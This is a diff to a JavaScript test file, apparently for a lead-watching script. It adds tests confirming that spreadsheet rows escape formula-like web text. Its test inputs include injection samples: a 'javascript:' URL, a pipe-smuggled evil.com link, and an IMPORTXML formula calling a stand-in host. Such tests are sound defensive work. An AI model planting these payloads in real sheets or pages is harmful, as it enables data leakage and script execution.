@@ -1,6 +1,6 @@
 // Checks the dedupe and double-signal rules. Run: node scripts/watch.test.mjs
 import assert from 'node:assert/strict';
-import { triage, heat, card } from './watch.mjs';
+import { triage, heat, card, sheetRow } from './watch.mjs';
 
 const clue = (company, type, extra = {}) => ({ company, type, headline: 'h', why_now: 'w', fit: 4, freshness: 4, intent: 3, ...extra });
 
@@ -36,5 +36,12 @@ const linked = u => card('Sobot', [{ ...clue('A', 'event'), types: ['event'], so
 assert.match(linked('https://example.com/a'), /<https:\/\/example\.com\/a\|source>/);
 assert.doesNotMatch(linked('https://evil.com|click here'), /source>/);
 assert.doesNotMatch(linked('javascript:alert(1)'), /source>/);
+
+// sheet rows: web text that looks like a formula is stored as plain text
+const row = sheetRow({ ...clue('=IMPORTXML("http://evil")', 'hiring'), types: ['hiring', 'event'], headline: '+1 raise' });
+assert.equal(row.company, `'=IMPORTXML("http://evil")`);
+assert.equal(row.headline, "'+1 raise");
+assert.equal(row.type, 'hiring + event');
+assert.equal(typeof row.heat, 'number');
 
 console.log('watch rules ok');
